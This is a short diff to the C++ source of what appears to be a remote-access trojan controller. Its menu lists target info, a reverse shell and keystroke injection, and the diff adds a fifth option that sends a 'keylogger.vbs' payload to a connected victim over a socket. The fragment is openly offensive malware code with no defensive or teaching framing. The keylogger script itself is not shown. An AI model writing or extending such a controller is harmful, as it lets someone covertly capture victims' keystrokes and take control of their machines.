@@ -103,7 +103,7 @@ int main(int argc, char *argv[])
                 break;
             }
             
-            case '4':                                                                   //Execute keylogger
+            case '4':                                                                   //Execute keystroke injector
             {
                 if (targetconnected)
                 {
@@ -115,6 +115,20 @@ int main(int argc, char *argv[])
 
                 break;
             }
+
+            case '5':                                                                   //Execute keylogger
+            {
+                if (targetconnected)
+                {
+                    send_data(sock,"from_server.txt", "5keylogger.vbs");
+                    cout << ">> Sent " << endl;
+                }
+                else cout << ">> Target not connected or socket invalid!!" << endl;
+                system("pause");
+
+                break;
+            }
+
             case '~':                                                                   //DC Current target
             {
                 if (targetconnected)
@@ -520,6 +534,7 @@ char Get_menu_option()
                                     Target Info                             2
                                     Rev Shell                               3
                                     KeyStroke Injection                     4
+                                    Run KeyLogger                           5
                                                                             )";            
                                     
     if(targetconnected)cout << R"(
